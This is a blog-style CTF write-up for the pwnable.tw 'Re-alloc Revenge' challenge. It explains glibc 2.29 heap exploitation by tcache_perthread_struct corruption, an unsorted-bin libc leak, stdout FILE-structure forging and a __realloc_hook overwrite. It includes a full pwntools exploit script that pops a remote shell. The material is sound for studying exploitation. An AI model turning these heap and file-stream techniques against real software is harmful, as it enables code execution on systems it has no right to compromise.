---
layout: post
title:  "Pwnable.tw - Re-alloc Revenge"
date:   2025-01-14 19:59:45 +0300
categories: jekyll update
---

**Contents**
* TOC
{:toc}
## Re-alloc Revenge

```bash
$ checksec ./re-alloc_revenge
[*] '/home/itay/projects/pwnable_tw/re-alloc_revenge/re-alloc_revenge'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    FORTIFY:    Enabled
    Stripped:   No

$ file ./re-alloc_revenge
./re-alloc_revenge: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./ld-2.29.so, for GNU/Linux 3.2.0, BuildID[sha1]=a93ffa9d1472955c6ee86b3c19759e6295f65f70, not stripped
```

Very similar to re-alloc challenge (also same libc) - but this time, PIE and full RELRO are enabled.

## Overview

The challenge is identical to Re-alloc, but with harsher mitigations. \
This means that as before, we have UAF, allowing us to overwrite freed chunk's metadata. 

## Exploitation

### TL;DR

The idea is simple : 

1. We start with an nearly-empty heap. Because there's no leak, allocate 2 tcache chunks, and partially overwrite its next's 2 LSBs in order to gain arbitrary-heap write primitive. Works at 1/16 chance due to 1 randomized nibble.

2. At the start of the heap, tcache_perthread_struct resides. Hence, we'd choose the target chunk to be this chunk. 

3. We'd fill the tcache.count[] array with large numbers, so it would falsely think all tcaches are populated

4. The original size of the tcache chunk is 0x250 bytes. Shrink it using realloc. Because the remainder is still within the tcache range (< 0x400) but larger than fastbin (> 0x80), AND the tcache counters have been filled (7 slots is the maximal per tcache bin), the remaindering would go into the unsortedbin.

5. By going into the unsortedbin, it leaves fd, bk that points to its corresponding head within the main_arena - which are libc pointers!

6. Carefully pick the shrink size, such that the fd, bk would fall into some tcache.bins[] head. 

7. Overwrite the LSBs of the fd, bk pointers there, so instead of pointing towards some crap main_arena address, we'd point to something we can work with - the stdout file stream (that resides at libc's data segment). Works at 1/16. 

8. Now, next allocation would be from the tcachebin head, which is the corrupted libc fd pointer, hence - libc write primitive without even leaking libc!

9. Overwrite stdout file stream. After reading the source (dont be lazy and do it), by setting the 3 flags ` IO_UNBUFFERED | IO_CURRENTLY_PUTTING | IO_IS_APPENDING`, we can bypass all basic sanity checks. The read pointers of the streams aren't even used in that path. Corrupt the read pointers, and set the `write_base` to lower, legitimate address. We can do so, by only overwriting its LSBs (recall `allocate` handler contains its off-by-one of a single `\x00`):

```c
if ((f->_flags & _IO_UNBUFFERED)
      || ((f->_flags & _IO_LINE_BUF) && ch == '\n'))
    if (_IO_do_write (f, f->_IO_write_base,
		      f->_IO_write_ptr - f->_IO_write_base) == EOF)
```

This means that instead of LSB equals to `\xe3`, we'd set it to `\x00` - leaking many interesting bytes. The second qword is a libc pointer, cool. 

10. All of the desired stages so far only requires one program-slot to remain allocated, while the other can be completely free. 

11. Having libc pointer, use the other slot to perform arbitrary write, overwriting any `__realloc_hook, __free_hook` into a one gadget (or `system`, but must set `;/bin/sh\x00` string within the chunk in this case, or set the string at the head of the chunk, while allocating it `8` bytes prior to the `stdout` file stream).

12. Trigger by issuing realloc (as both slots should be populated), get flag

### Write Primitive

We have the exact same write primitive as before - we can freely write into chunks metadata. 
By overwriting tcache `next`, this gives us arbitrary-write freely. 

### Read Primitive

The main challenge is that we don't have any leak. \
A cool trick we can do, is utilize the fact that our write primitive starts overwriting chunk's `next` pointer. 
Hence, even without a heap leakage, due to ASLR not affecting the lowermost 12 bits, we can (almost) deterministically overwrite heap addresses, by only writing their 2 LSBs (we would win at 1/16 chance, as there should be one randomized nibble). \
So by doing so, **we have arbitrary heap write primitive, without the need for any leak** - without randomization if we fall within the same `0x100` bytes scope, or with `1/16` chance for the generic heap-address case. How can we leverage this to an arbitrary read (or at least, libc leak)? \
My general idea is to start by popping libc pointers on the heap, and go on from there. The heap seems pretty empty, except for one extra chunk, the `tcache_perthread_struct`:

```bash
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x64257eba6000
Size: 0x250 (with flag bits: 0x251)

Free chunk (tcachebins) | PREV_INUSE
Addr: 0x64257eba6250
Size: 0x30 (with flag bits: 0x31)
fd: 0x64257eba6290

Free chunk (tcachebins) | PREV_INUSE
Addr: 0x64257eba6280
Size: 0x30 (with flag bits: 0x31)
fd: 0x00

Top chunk
Addr: 0x64257eba62b0
Size: 0x20c00 (with flag bits: 0x20c00)
```

This is the first allocated chunk:

```c
# define TCACHE_MAX_BINS		64
typedef struct tcache_perthread_struct
{
  char counts[TCACHE_MAX_BINS];
  tcache_entry *entries[TCACHE_MAX_BINS];
} tcache_perthread_struct;
```

Hence, a total of `64 * (1 + 8) = 0x240` bytes. 
As we can see, including the metadata, it have been allocated within a bin corresponds to size class `0x250`. \
This gives me a new idea - while we can regularly allocate only chunks within the tcache range, because we have arbitrary heap-write primitive, we can create fake chunks - having sizes outside of the tcache range. Such chunks deallocations might leave trails of their corresponding bin heads of the `main_arena` within their `fd, bk` - hence, leave trails of libc pointers within the heap. \
I've tried and eventually suceedded to create chunk that would have size class past the limit of `0x80` (in this case, `0x90`):

```python
    fake_size = 0x90
    # Allocate chunks
    fake_chunk = p64(0)         # will get corrupted by next
    fake_chunk += p64(0)        # and by key
    fake_chunk += p64(0)        # prev_size
    fake_chunk += p64(fake_size | 0x1)     # new size
    alloc(p, 0, alloc_size, fake_chunk)    

    fake_next_chunk = b'A' * (fake_size - chunkSize(alloc_size) + 0x10)
    fake_next_chunk += p64(fake_size)  # prev_size, match the fake chunk
    fake_next_chunk += p64(fake_size | 0x1)
    alloc(p, 1, alloc_size, fake_next_chunk)

    # Make sure the second chunk's next is initialized to non-NULL
    free(p, 0)
    realloc(p, 1, 0, b'')

    # Overwrite 'next' LSB, so that it would point to the fake chunk
    realloc(p, 1, alloc_size, b'\x80')

    # Consume tcachebin head. Now the fake chunk is the tcache head!
    alloc(p, 0, alloc_size, p64(0))

    # We now want the 2 slots to be available. 
    # Increment size, prepare to free on different bin
    realloc(p, 1, alloc_size + 0x10, fake_chunk)
    # Return 
    free(p, 1)
    # The same for the other chunk
    realloc(p, 0, alloc_size + 0x20, fake_chunk)
    free(p, 0)

    # Consume the fake chunk, to be sent to its fake freelist!
    alloc(p, 0, alloc_size, b'B')
    # Notice - we MUST make sure its fake 'next' chunk isn't beyond top. 
    # That's why I had to forge a perfect fake next chunk for. 
    # Free it. Now libc pointers would be here!
    free(p, 0)
```

... only to recall it is still within the tcache range (but not within the fastbins T_T). \
This means that the chunk I'd like to fake should be at least `0x200` bytes (or is it `0x100` for this glibc version), such that it wouldn't fall within the tcache for sure (or alternatively - populate the unsorted bin). \
The `tcache_perthread_struct` chunk seems as a yummy target, yet recall it doesn't contains any libc pointers at all. 

At this point I've decided there are very few options in which we can pop libc pointers:

1. Rely on other heap structures. We don't have anything though, yay. Can we somehow spawn some stuff on the heap? Such as file structs?

2. Try harder to create non-tcache non-fastbin chunks. This way, upon freeing them, they would leave `fd, bk` that would point to their head within libc's main arena. But.. its hard, due to the next chunk's size checks. Because we have only 2 small allocations, we cannot forge chunks further enough to mimic the fake next chunk. 

3. Use the heap arbitrary write primitive, such that the `tcache_perthread_struct` would be our target. That way, we can corrupt its `bins` metadata. Furthermore, It may also considered as a legitimate chunk to-be-freed, while making sure its size class `>=0x200`. That way, it would leave trails of libc pointers within the heap, as its `fd, bk` metadata. We could further corrupt them (at least partially) - potentially extending the write primitive into libc. 

4. Mess with the top chunk. Exhausing it would eventually leave `fd, bk` pointers - just as a regular chunk. As mentioned, we cannot exhaust it legitimately, as we cannot make enough allocations. However, we can utilize the heap-arbitrary-write in order to overwrite its size to some very low value, hence - exhaust the top chunk. Notice that there are few mitigations regarding the top chunk, the hardest one requires it to end within a page boundary. Unfortuanately, this means we have to be able to make around ~`0x1000` bytes of allocations (as the heap is nearly empty) in order to exhaust the top chunk, and cause it to free. Because we're limited for only `2` small allocations, this probably won't work. 

5. Overwrite content within pages adjascent to the heap memory segment. There are none, as there's a 20-bit randomized gap between the heap and the program's data segment. Hooray.

The following script corrupts the top chunk's size, but as mentioned within point (4), it's indeed very limited to due the alignment mitigation. 

```python
# Allocate chunks
    alloc(p, 0, alloc_size, b'A')
    alloc(p, 1, alloc_size, b'B')
    # Make sure the second chunk's next is initialized to non-NULL
    free(p, 0)
    realloc(p, 1, 0, b'')
    # Overwrite 'next' LSB, so that it would point to the target
    realloc(p, 1, alloc_size, b'\xd8')
    # Consume tcachebin head. Now the target is the tcache head!
    alloc(p, 0, alloc_size, p64(0))
    # We now want the 2 slots to be available. 
    # Increment size, prepare to free on different bin
    realloc(p, 1, alloc_size + 0x10, b'C')
    # Return 
    free(p, 1)
    # The same for the other chunk
    realloc(p, 0, alloc_size + 0x20, b'D')
    free(p, 0)

    # Corrupt the top chunk's size
    alloc(p, 0, alloc_size, p64(0x91))
    #alloc(p, 1, alloc_size + 0x50, b'E')
```

Hence, out of the proposed ideas, the only viable one seems to be option (3), which is a total mess. \
Upon freeing both chunks, we acquire the following heap layout:

```bash
0x609d6178b250  0x0000000000000000      0x0000000000000031      ........1.......
0x609d6178b260  0x0000000000000000      0x0000609d6178b010      ..........xa.`..         <-- tcachebins[0x30][1/2]
0x609d6178b270  0x4141414141414141      0x4141414141414141      AAAAAAAAAAAAAAAA
0x609d6178b280  0x0041414141414141      0x0000000000000031      AAAAAAA.1.......
0x609d6178b290  0x0000609d6178b260      0x0000609d6178b010      `.xa.`....xa.`..         <-- tcachebins[0x30][0/2]
0x609d6178b2a0  0x4242424242424242      0x4242424242424242      BBBBBBBBBBBBBBBB
0x609d6178b2b0  0x0042424242424242      0x0000000000020d51      BBBBBBB.Q.......         <-- Top chunk
```

This means we can overwrite chunk-1's `next` LSBs, `0x0000609d6178b260`, such that it would point to the `tcache_perthread_struct`. \
Notice that because this struct resides at the start of the page, we must overwrite 2 bytes (to result address `0x0000609d6178b000`). 
12 lowest bits are deterministic, hence - 4 bit randomization would occur (hence, the exploit would work at 1/16 chance :/). 
By forging this fake chunk at `tcache_perthread_struct`, as well as faking an adequate next chunk, we would be able to free it - leaving libc pointers as `fd, bk`. 
We just have to consider the extra overwrite we have to perform, this case within `0x609d6178b250`, to overwrite the fake next chunk metadata. \
Notice that even freeing the `0x250` chunk would land it into the tcachebins, as the tcache max size is `0x400` for this glibc version.

*Q: Assuming we would successfully allocate a chunk overlapping the `tcache_perthread_struct` chunk (having size of `0x250`), how would realloc perform on it?* \
*A: `realloc(ptr, 0x78)` would attempt to SHRINK it, hence - leaving a free chunk of size `0x250 - 0x80`. If the tcache bin of that corresponding size would be full, it would go directly to the unsortedbin.* 

Indeed, by corrupting the whole `counter` array of the tcache, **the above chunk falls into the unsortedbin, and doesn't goes through the tcache. This means it leaves libc pointers as its `fd, bk`!** 

The following script would perform an allocation overlapping the `tcache_perthread_struct` chunk, and shrink it, such that it would leave libc pointers on the heap due to the remainder falling into the unsortedbin. 
Also notice, that because we're overwriting the tcache struct itself, we gain infinite arbitrary-heap write primitive, without any leak.

```python
# Step 1 - prepare the tcachebins heads to our goal addresses to overwrite
# Store arbitrary heap address, to be used later. Not used for now.
set_tcache_head(p, new_lsbs=b'\x50', alloc_size=0x28)
# Set the target to tcache_perthread_struct's chunk. Works at 1/16 due to ASLR. 
set_tcache_head(p, new_lsbs=p16(0x10), alloc_size=0x58)  
# Step 3 - overwrite the tcache chunk's content with W/E we'd like
alloc(p, 1, 0x58, b'Z' * (0x58 - 1))
```

Indeed, the heap layout post-shrinking the tcache struct:

```bash
0x6252422a8000  0x0000000000000000      0x0000000000000081      ................
0x6252422a8010  0x5757575757575757      0x5757575757575757      WWWWWWWWWWWWWWWW
0x6252422a8020  0x5757575757575757      0x5757575757575757      WWWWWWWWWWWWWWWW
0x6252422a8030  0x5757575757575757      0x5757575757575757      WWWWWWWWWWWWWWWW
0x6252422a8040  0x5757575757575757      0x5757575757575757      WWWWWWWWWWWWWWWW
0x6252422a8050  0x5757575757575757      0x5757575757575757      WWWWWWWWWWWWWWWW
0x6252422a8060  0x5757575757575757      0x5757575757575757      WWWWWWWWWWWWWWWW
0x6252422a8070  0x5757575757575757      0x5757575757575757      WWWWWWWWWWWWWWWW
0x6252422a8080  0x0057575757575757      0x00000000000001d1      WWWWWWW.........         <-- unsortedbin[all][0]
0x6252422a8090  0x0000717477503ca0      0x0000717477503ca0      .<Pwtq...<Pwtq..
0x6252422a80a0  0x0000000000000000      0x0000000000000000      ................
```

Now that we're having libc pointers on the heap, which is part of the `main_arena` of libc, we can use them to overwrite stuff within libc's data segment.
In particular, we could land them on one of the tcachebins heads. \
Also, while the difference between the `main_arena` and `_IO_2_1_stdout_` is constant, we'd still need to brute force one byte, as we have no libc leakage:

```bash
unsortedbin
all: 0x5583316e3080 —▸ 0x72d375b36ca0 ◂— 0x5583316e3080
pwndbg> x/10gx 0x000072d375b37760
0x72d375b37760 <_IO_2_1_stdout_>:       0x00000000fbad2887      0x000072d375b377e3
0x72d375b37770 <_IO_2_1_stdout_+16>:    0x000072d375b377e3      0x000072d375b377e3
```

As we can see, the `main_arena` is around `0x72d375b36ca0`, and the stdout file stream resides within `0x72d375b37760`. \
One more extra nibble to brute force means `1 / 256` odds. I'm sure there is a way to spawn libc pointers within the `tcache_perthread_struct` area without any randomization though. \
Another problem is that by using the second allocation as a chunk that points to `stdout`, we won't be able to perform writes at any other addresses - as this chunk is un-freeable. 
Hence, we must reuse the "tcache-chunk" to perform the write primitive. But this shouldn't be hard, as this chunk is free-able legitimately. \
My end goal would be overwriting any `__malloc_hook, __free_hook, __realloc_hook` to one-gadget. 
The plan is simple: use the stdout chunk for libc leak, and the other chunk for performing the write itself. \
Recall how file streams works - there's an intermediate buffer, whose addresses defined by the file stream object. 
If we can manipulate the inner pointers, we can obtain read / write primitives. \
For this case, we'd like to have read primitive, hence we have to mess with the "write" flow of the stream (as it writes from memory to `fd`). \

The original file stream flags were `0x00000000fbad2887`. We could perform linear overwrite of the file stream, 
but since we have no addresses leakage at this point, we would have to fake the stream object in a tricky manner. \
The stream's flags are defined within `libio.h`. The internal implementation we're invoking is `_IO_new_file_xsputn`, 
which runs with the first prompt buffer of `menu`, having `n == 0x1c`:

```bash
pwndbg> bt
#0  0x00007082fd64dab0 in _IO_file_xsputn () from ./libc-9bb401974abeef59efcdd0ae35c5fc0ce63d3e7b.so
#1  0x00007082fd642d8e in puts () from ./libc-9bb401974abeef59efcdd0ae35c5fc0ce63d3e7b.so
#2  0x000056fc89d92690 in menu ()
#3  0x000056fc89d9272a in main ()
#4  0x00007082fd5e5b6b in __libc_start_main () from ./libc-9bb401974abeef59efcdd0ae35c5fc0ce63d3e7b.so
#5  0x000056fc89d9212a in _start ()
```

Recall we're interested with writing the internal buffer to the fd, and it should be as many bytes as we can. 
By reading the sources of `_IO_file_xsputn`, we can that we don't meet the "fill intermediate buffer" criterias, 
yet we do meet the flush criterias. 

```c
  if (to_do + must_flush > 0)
    {
      size_t block_size, do_write;
      /* Next flush the (full) buffer. */
      if (__overflow (f, EOF) == EOF)
	return to_do == 0 ? EOF : n - to_do;
```

This means that internally we call `_IO_file_overflow` to perform the flush. \
Our goal is to trick the flags and file stream pointers, such that the `_IO_do_flush / _IO_do_write` would occur:

```c
#define _IO_do_flush(_f) \
  ((_f)->_mode <= 0							      \
   ? _IO_do_write(_f, (_f)->_IO_write_base,				      \
		  (_f)->_IO_write_ptr-(_f)->_IO_write_base)		      \
   : _IO_wdo_write(_f, (_f)->_wide_data->_IO_write_base,		      \
		   ((_f)->_wide_data->_IO_write_ptr			      \
		    - (_f)->_wide_data->_IO_write_base)))
```

Eventually, this macro resolves to `_IO_new_do_write`, which actually performs the write syscall to the fd. \
As we can see, the code we're eventually invoking:

```c
 /* If currently reading or no buffer allocated. */
if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0 || f->_IO_write_base == NULL)
{
    ...
}
...
if (f->_IO_write_ptr == f->_IO_buf_end ) /* Buffer is really full */
    if (_IO_do_flush (f) == EOF)
...
if ((f->_flags & _IO_UNBUFFERED)
      || ((f->_flags & _IO_LINE_BUF) && ch == '\n'))
    if (_IO_do_write (f, f->_IO_write_base,
		      f->_IO_write_ptr - f->_IO_write_base) == EOF)
```

Hence, we must set the `_IO_CURRENTLY_PUTTING` flag. \
We do not meet the criteria of `write_ptr == buf_end`, and we can set the `_IO_UNBUFFERED`. \
This way we'd hit `_IO_do_write`, with our fake-nibbl'ed `write_base` pointer. \
Next, `new_do_write` is called:

```c
if (fp->_flags & _IO_IS_APPENDING)
    /* On a system without a proper O_APPEND implementation,
       you would need to sys_seek(0, SEEK_END) here, but is
       not needed nor desirable for Unix- or Posix-like systems.
       Instead, just indicate that offset (before and after) is
       unpredictable. */
    fp->_offset = _IO_pos_BAD;
  else if (fp->_IO_read_end != fp->_IO_write_base)
    {
      off64_t new_pos
	= _IO_SYSSEEK (fp, fp->_IO_write_base - fp->_IO_read_end, 1);
      if (new_pos == _IO_pos_BAD)
	return 0;
      fp->_offset = new_pos;
    }
  count = _IO_SYSWRITE (fp, data, to_do);
```

By settings the `IS_APPENDING` flag, we won't have to deal with the whole internal offset-adjustments. \
So in total, by setting the 3 flags - `IS_APPENDING, IO_CURRENTLY_PUTTING, IO_UNBUFFERED`, and adjusting the `LSB`s of `write_base`, 
we would be able to trigger leak, starting from our overwritten (to `\x00` LSB) `write_base` pointer. 

## Solution

```python
#!/usr/bin/python3

from pwn import *

HOST = 'chall.pwnable.tw'
PORT = 10106
context.arch='amd64'
BINARY = './re-alloc_revenge'
LIBC = './libc-9bb401974abeef59efcdd0ae35c5fc0ce63d3e7b.so'
LD = './ld-2.29.so'

GDB_SCRIPT = '''
b *reallocate + 0x133
commands
    p "Just overwritten buffer to tcache_perthread_struct. Mimicing ASLR-win.."
    set *(unsigned long long *)($rsi) = (($rsi & 0xfffffffffffff000) | 0x10)
    delete 1
    c
end

b *reallocate + 0x142
commands
    p "Mimicing stdout correct overwrite"
    set *(unsigned long long *)($rsi + 0x60) = (unsigned char *)stdout
    delete 2
    b *allocate + 0x124
    commands
        p "just done allocate"
    end
    c
end


ignore 2 5

c
'''

def unsigned(n, bitness=32):
    if n < 0:
        n = n + 2**bitness
    return n

def pad(buf, alignment, delimiter=b'\x00'):
    if (len(buf) % alignment) == 0:
        return buf

    extra = (alignment - (len(buf) % alignment)) * delimiter
    return buf + extra

def splitted(buf, n):
    for i in range(0, len(buf), n):
        yield buf[i: i + n]

def chunkSize(alloc_size):
    assert(alloc_size >= 0)
    min_size = alloc_size + SIZEOF_PTR
    res = min_size % (2 * SIZEOF_PTR)
    pad = (2 * SIZEOF_PTR) - res if res else 0
    return min_size + pad

def allocSize(chunkSize):
    assert((chunkSize & 0xf) == 0)
    return chunkSize - SIZEOF_PTR

def recvPointer(p):
    leak = p.recv(SIZEOF_PTR)
    assert(len(leak) == SIZEOF_PTR)
    if SIZEOF_PTR == 4:
        leak = u32(leak)
    else:
        leak = u64(leak)
    assert(leak > 0x10000)
    return leak

###### Constants ######
IS_DEBUG = False 
IS_REMOTE = True 
SIZEOF_PTR = 8
CHUNK_DELTA = 0x10
SMALLEST_ALLOC_SIZE = 0x18
SMALL_ALLOC_SIZE = 0x28
DECENT_ALLOC_SIZE = 0x58
LARGE_ALLOC_SIZE = 0x78
TCACHE_CHUNK_SIZE = 0x250
STREAM_MAGIC = 0xfbad0000
IO_UNBUFFERED = 0x2
IO_CURRENTLY_PUTTING = 0x800
IO_IS_APPENDING = 0x1000
TCACHE_COUNTERS_SIZE = 0x40

###### Offsets ######
libc_leak_to_base = 0x1e7570
one_gadget = 0x106ef8
tcache_perthread_struct_lsb = 0x10
stdout_lsbs = 0x7760

###### Addresses ######
binary = ELF(BINARY)
main_binary = binary.symbols['main']
puts_got = binary.got['puts']
puts_plt = binary.plt['puts']
atoll_got = binary.got['atoll']
printf_got = binary.got['printf']
printf_plt = binary.plt['printf']

libc = ELF(LIBC)
bin_sh_libc = next(libc.search(b'/bin/sh'))
system_libc = libc.symbols['system']
puts_libc = libc.symbols['puts']
environ_libc = libc.symbols['environ']
realloc_hook = libc.symbols['__realloc_hook'] 
free_hook = libc.symbols['__free_hook']
log.info(f'bin_sh_libc: {hex(bin_sh_libc)}')
log.info(f'system_libc: {hex(system_libc)}')
log.info(f'puts_libc: {hex(puts_libc)}')
log.info(f'environ: {hex(environ_libc)}')

libc_rop = ROP(LIBC)
# pop_eax_ret = libc_rop.eax.address
# pop_ebx_ret = libc_rop.ebx.address
# pop_ecx_ret = libc_rop.ecx.address
# pop_edx_ret = libc_rop.edx.address
# leave_ret = libc_rop.find_gadget(['leave']).address
# int_80 = libc_rop.find_gadget(['int 0x80']).address
# log.info(f'pop_eax_ret: {hex(pop_eax_ret)}')
# log.info(f'pop_ebx_ret: {hex(pop_ebx_ret)}')
# log.info(f'pop_ecx_ret: {hex(pop_ecx_ret)}')
# log.info(f'pop_edx_ret: {hex(pop_edx_ret)}')
# log.info(f'leave_ret: {hex(leave_ret)}')
# log.info(f'int_80: {hex(int_80)}')


def alloc(p, index, size, data, to_flush=True):
    p.sendline(b'1')
    p.recvuntil(b'Index:')
    p.sendline(str(index).encode())
    p.recvuntil(b'Size:')
    p.sendline(str(size).encode())
    p.recvuntil(b'Data:')
    p.send(data)
    if to_flush:
        p.recvuntil(b'Your choice: ')

def realloc(p, index, size, data, to_flush=True):
    p.sendline(b'2')
    p.recvuntil(b'Index:')
    p.sendline(str(index).encode())
    p.recvuntil(b'Size:')
    p.sendline(str(size).encode())
    if size == 0:
        if to_flush:
            p.recvuntil(b'alloc error\n')
    else: 
        if to_flush:
            p.recvuntil(b'Data:')
        p.send(data)
    if to_flush:
        p.recvuntil(b'Your choice: ')

def free(p, index):
    p.sendline(b'3')
    p.recvuntil(b'Index:')
    p.sendline(str(index).encode())
    p.recvuntil(b'Your choice: ')

def set_tcache_head(p, addr_lsbs, alloc_size):
    ''' Sets the freelist head of tcachebin corresponding to size class 'alloc_size'.
    Apparently, for glibc-2.29, eventhough the tcachebin's count is 0, as long as its head isn't NULL - it would perform allocation.
    For newer versions of glibc this isn't the case anymore, and __libc_malloc mitigates this,
    by also verifying that the count is larger than 0.
    '''
    alloc(p, 0, alloc_size, b'A' * (alloc_size - 1))
    alloc(p, 1, alloc_size, b'B' * (alloc_size - 1))
    # Make sure the second chunk's next is initialized to non-NULL
    free(p, 0)
    realloc(p, 1, 0, b'')
    # Overwrite 'next' LSB, so that it would point to the tcache_perthread_struct
    realloc(p, 1, alloc_size, addr_lsbs)
    # Consume tcachebin head. Now the target is the tcache head!
    alloc(p, 0, alloc_size, b'C' * (alloc_size - 1))
    # We now want the 2 slots to be available. 
    # Increment size, prepare to free on different bin
    alloc_size_2 = alloc_size + 0x10
    realloc(p, 1, alloc_size_2, b'D' * (alloc_size_2 - 1))
    free(p, 1)
    # The same for the other chunk
    alloc_size_3 = alloc_size_2 + 0x10
    realloc(p, 0, alloc_size_3, b'E' * (alloc_size_3 - 1))
    free(p, 0)

def overwrite_chunk_fd(p, addr_lsbs):
    # Overwrite the tcache counters
    buf = b'W' * TCACHE_COUNTERS_SIZE 
    # Overwrite the irrelevant tcache heads
    buf += b'\x00' * int((chunkSize(DECENT_ALLOC_SIZE) - chunkSize(SMALLEST_ALLOC_SIZE)) / 2 - 0x8)
    # Keep the same chunk's size
    buf += p64((TCACHE_CHUNK_SIZE - (chunkSize(DECENT_ALLOC_SIZE)) ) | 0x1)
    # Overwrite the LSBs of libc's fd, now stored on the tcache.
    # Notice: works 1/16, due to libc's ASLR. 
    buf += addr_lsbs
    realloc(p, 0, LARGE_ALLOC_SIZE, buf)

def arbitrary_write(p, addr, data):
    # Clean the whole tcache
    # Overwrite tcache counters
    buf = b'W' * TCACHE_COUNTERS_SIZE 
    buf += p64(addr)
    # Overwrite tcache[0x20] pointer
    realloc(p, 0, LARGE_ALLOC_SIZE, buf)
    # Free the slot
    free(p, 0)
    # Trigger the write
    alloc(p, 0, SMALLEST_ALLOC_SIZE, data)

def leak_libc(p):
    # The stream's flags are defined within libio.h.
    # The internal implementation we're invoking is '_IO_new_file_xsputn'.
    # Recall we're interested with flushing the internal buffer to the fd,
    # and it should be as many bytes as we can. 
    fake_stream = p64(STREAM_MAGIC | IO_UNBUFFERED | IO_CURRENTLY_PUTTING | IO_IS_APPENDING)
    # Set the whole read pointers to NULL
    fake_stream += p64(0) * 3
    # Important: also sets the LSB of write_base to '\x00' due to off-by-one. 
    # We can overwrite an extra '\x00' to achieve even larger leak, no need though
    alloc(p, 1, DECENT_ALLOC_SIZE, fake_stream, to_flush=False)
    p.recv(8)
    libc_leak = recvPointer(p) 
    libc_base = libc_leak - libc_leak_to_base
    assert((libc_base & 0xfff) == 0)
    p.recvuntil(b'Your choice: ')
    return libc_base

####### Exploit #######
def exploit(p):
    p.recvuntil(b'Your choice: ')

    # Step 1 - prepare the tcache head to our goal addresses to overwrite.
    # The target is tcache_perthread_struct's chunk. Works at 1/16 rate due to ASLR. 
    set_tcache_head(p, addr_lsbs=p16(tcache_perthread_struct_lsb), alloc_size=SMALL_ALLOC_SIZE)  
    log.info("tcache head set to tcache_perthread_struct")

    # Step 2 - split the tcache chunk
    # Important: we must overwrite the remaindering chunk's tcachebin's counter, 
    # tcache[0x250-0x80 = 0x1d0].count, to some large number (> 7).
    # By doing so, the tcache bin is considered as full, and upon shrinkage, 
    # it would go to the unsortedbin, and not to the tcachebin
    alloc(p, 0, SMALL_ALLOC_SIZE, b'Z' * (SMALL_ALLOC_SIZE - 1))
    # Shrink it, now the remainder would fall into the unsortedbin!
    # In particular, fd and bk would be written to tcache[0x60], tcache[0x70]. 
    realloc(p, 0, (DECENT_ALLOC_SIZE), b'W')
    log.info("Chunk fallen to unsortedbin, leaving fd & bk libc trails")

    # Step 3 - overwrite to stdout
    # Now that the libc's fd is fallen to tcache[0x60], tcache[0x70] heads, overwrite it partially and reach STDOUT
    overwrite_chunk_fd(p, addr_lsbs=p16(stdout_lsbs))
    log.info(f'Overwrote unsortenbin chunk fd to stdout')

    # Step 4 - Overwrite file stream and perform leak
    libc_base = leak_libc(p)
    log.info(f'libc_base: {hex(libc_base)}')

    # Step 5 - overwrite __realloc_hook to one_gadget 
    # (alternatively, we could overwrite __free_hook and set the chunk's first 8 bytes to "/bin/sh\x00")
    arbitrary_write(p, libc_base + realloc_hook, p64(libc_base + one_gadget))
    log.info("Overwritten realloc_hook successfully!")

    # Step 6 - trigger one gadget, pop shell
    realloc(p, 0, SMALLEST_ALLOC_SIZE, b'A', to_flush=False)
    # Stabilize shell
    p.sendline(b'sh\x00')
    p.sendline(b'ls -la')

def main_internal():
    if IS_DEBUG:
        p = gdb.debug(BINARY, gdbscript=GDB_SCRIPT)
    else:
        if IS_REMOTE:
            with remote(HOST, PORT) as p:
                exploit(p)
                log.info('Win')
                p.interactive()
        else:
            with process(BINARY) as p:
                exploit(p)
                log.info('Win')
                p.interactive()

def main():
    while True:
        try:
            main_internal()
        except Exception as e:
            log.info(f'Got: {e}')

if __name__ == '__main__':
    main()
```

For some reason, eventhough I've got a shell - the above solution didn't worked for HOURS. \
After carefully debugging the remote machine, I've realized that I was a hardcore-potato-head, 
as I've forgot to change the remote port to `re-alloc_revenge` instead of `re-alloc` T_T.

Up to the challenge, the most important lesson I've learned is that even without any read primitive, we can still further improve our write primitive, sometimes way more than we might think. 
The fact that we could have arbitrary heap write at 1/16 odds, and arbitrary libc write at 1/256, is pretty cool. \
As for technical details, I've recalled few basics regarding file stream exploitation. In particular, the fact that many of the checked criterias before flushing a memory buffer to `fd` can be easily bypassed, is pretty cool. 
Notice it is very important to read the glibc sources of the file stream implementation, as it might vary between versions. For example, I recall that modern glibc versions have extra mitigation upon stream-write, of `read_end == write_base`, which would wreck us in this challenge. \
Another cool trick is the usage of `__hook` functions - `__realloc_hook, __free_hook` in particular, which are very handy in order to obtain arbitrary branch primitives for FULL-RELRO binaries. 
Keep in mind we weren't necessarily had to use the `one_gadget`, but we could store `;/bin/sh` string somewhere within the chunk, and call `system`.
